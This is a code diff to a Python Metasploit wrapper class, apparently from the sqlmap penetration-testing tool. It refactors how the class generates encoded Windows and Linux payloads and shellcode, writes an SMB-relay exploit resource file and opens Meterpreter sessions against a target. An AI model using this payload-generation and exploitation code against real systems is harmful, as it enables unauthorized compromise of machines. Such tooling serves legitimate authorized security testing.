@@ -300,7 +300,7 @@ class Metasploit:
 
 
     def __selectLhost(self):
-        if self.connectionStr.startswith("reverse"):
+        if self.connectionStr.startswith("reverse") or self.resourceFile != None:
             message = "which is the local address? [%s] " % self.localIP
             address = readInput(message, default=self.localIP)
 
@@ -355,6 +355,8 @@ class Metasploit:
 
 
     def __forgeMsfConsoleResource(self):
+        self.resourceFile = "%s/%s" % (conf.outputPath, self.__randFile)
+
         self.__prepareIngredients(encode=False, askChurrasco=False)
 
         self.__resource  = "use windows/smb/smb_relay\n"
@@ -374,14 +376,12 @@ class Metasploit:
 
         self.__resource += "exploit\n"
 
-        self.resourceFile = "%s/%s" % (conf.outputPath, self.__randFile)
-        self.resourceFp   = open(self.resourceFile, "w")
-
+        self.resourceFp = open(self.resourceFile, "w")
         self.resourceFp.write(self.__resource)
         self.resourceFp.close()
 
 
-    def __forgeMsfPayloadCmd(self, exitfunc="process", output="exe", extra=None):
+    def __forgeMsfPayloadCmd(self, exitfunc, format, outFile, extra=None):
         self.__payloadCmd  = self.__msfPayload
         self.__payloadCmd += " %s/%s" % (self.payloadStr, self.connectionStr)
         self.__payloadCmd += " EXITFUNC=%s" % exitfunc
@@ -394,16 +394,18 @@ class Metasploit:
             raise sqlmapDataException, "unexpected connection type"
 
         if kb.os == "Windows":
-            self.__payloadCmd += " R | %s -e %s -t %s" % (self.__msfEncode, self.encoderStr, output)
+            self.__payloadCmd += " R | %s -a x86 -e %s -o %s -t %s" % (self.__msfEncode, self.encoderStr, outFile, format)
 
             if extra is not None:
                 self.__payloadCmd += " %s" % extra
 
+        # TODO: payload stager for Linux can not be encoded as long as
+        # Metasploit developers do not commit my minor patch for msfencode
         else:
-            self.__payloadCmd += " X"
+            self.__payloadCmd += " X > %s" % outFile
 
 
-    def __runMsfCli(self, exitfunc="process"):
+    def __runMsfCli(self, exitfunc):
         self.__forgeMsfCliCmd(exitfunc)
 
         infoMsg  = "running Metasploit Framework 3 command line "
@@ -411,7 +413,6 @@ class Metasploit:
         logger.info(infoMsg)
 
         logger.debug("executing local command: %s" % self.__cliCmd)
-
         self.__msfCliProc = execute(self.__cliCmd, shell=True, stdin=PIPE, stdout=PIPE)
 
 
@@ -420,7 +421,6 @@ class Metasploit:
         logger.info(infoMsg)
 
         logger.debug("executing local command: %s" % self.__consoleCmd)
-
         self.__msfConsoleProc = execute(self.__consoleCmd, shell=True, stdin=PIPE, stdout=PIPE)
 
 
@@ -515,7 +515,7 @@ class Metasploit:
 
                     metSess = re.search("Meterpreter session ([\d]+) opened", out)
 
-                    if metSess and self.payloadStr == "windows/meterpreter":
+                    if metSess:
                         self.__loadMetExtensions(proc, metSess.group(1))
 
             except EOFError:
@@ -530,16 +530,15 @@ class Metasploit:
         logger.info(infoMsg)
 
         self.__randStr           = randomStr(lowercase=True)
-        self.shellcodeChar       = ""
         self.__shellcodeFilePath = "%s/sqlmapmsf%s" % (conf.outputPath, self.__randStr)
-        self.__shellcodeFileP    = open(self.__shellcodeFilePath, "wb")
+        self.shellcodeChar       = ""
 
         self.__initVars()
         self.__prepareIngredients(askChurrasco=False)
-        self.__forgeMsfPayloadCmd(exitfunc="seh", output="raw", extra="-b \"\\x00\\x27\"")
+        self.__forgeMsfPayloadCmd("seh", "raw", self.__shellcodeFilePath, "-b \"\\x00\\x27\"")
 
         logger.debug("executing local command: %s" % self.__payloadCmd)
-        process = execute(self.__payloadCmd, shell=True, stdout=self.__shellcodeFileP, stderr=PIPE)
+        process = execute(self.__payloadCmd, shell=True, stdout=None, stderr=PIPE)
 
         dataToStdout("\r[%s] [INFO] creation in progress " % time.strftime("%X"))
         pollProcess(process)
@@ -550,8 +549,6 @@ class Metasploit:
         else:
             payloadSize = re.search("Length\:\s([\d]+)", payloadStderr, re.I)
 
-        self.__shellcodeFileP.close()
-
         if payloadSize:
             payloadSize = payloadSize.group(1)
 
@@ -561,9 +558,9 @@ class Metasploit:
             errMsg = "failed to create the shellcode (%s)" % payloadStderr
             raise sqlmapFilePathException, errMsg
 
-        self.__shellcodeFileP  = open(self.__shellcodeFilePath, "rb")
-        self.__shellcodeString = self.__shellcodeFileP.read()
-        self.__shellcodeFileP.close()
+        self.__shellcodeFP     = open(self.__shellcodeFilePath, "rb")
+        self.__shellcodeString = self.__shellcodeFP.read()
+        self.__shellcodeFP.close()
 
         os.unlink(self.__shellcodeFilePath)
 
@@ -587,10 +584,10 @@ class Metasploit:
 
         if kb.os == "Windows":
             self.exeFilePathLocal = "%s/sqlmapmsf%s.exe" % (conf.outputPath, self.__randStr)
+            self.__fileFormat     = "exe"
         else:
             self.exeFilePathLocal = "%s/sqlmapmsf%s" % (conf.outputPath, self.__randStr)
-
-        self.__exeFileP = open(self.exeFilePathLocal, "wb")
+            self.__fileFormat     = "elf"
 
         if initialize == True:
             self.__initVars()
@@ -598,10 +595,10 @@ class Metasploit:
         if self.payloadStr == None:
             self.__prepareIngredients()
 
-        self.__forgeMsfPayloadCmd()
+        self.__forgeMsfPayloadCmd("process", self.__fileFormat, self.exeFilePathLocal)
 
         logger.debug("executing local command: %s" % self.__payloadCmd)
-        process = execute(self.__payloadCmd, shell=True, stdout=self.__exeFileP, stderr=PIPE)
+        process = execute(self.__payloadCmd, shell=True, stdout=None, stderr=PIPE)
 
         dataToStdout("\r[%s] [INFO] creation in progress " % time.strftime("%X"))
         pollProcess(process)
@@ -611,8 +608,6 @@ class Metasploit:
             payloadSize = re.search("size ([\d]+)", payloadStderr, re.I)
         else:
             payloadSize = re.search("Length\:\s([\d]+)", payloadStderr, re.I)
-
-        self.__exeFileP.close()
 
         os.chmod(self.exeFilePathLocal, stat.S_IRWXU)
 
@@ -646,7 +641,7 @@ class Metasploit:
 
 
     def pwn(self):
-        self.__runMsfCli()
+        self.__runMsfCli(exitfunc="process")
 
         if self.connectionStr.startswith("bind"):
             self.__runMsfPayloadRemote()
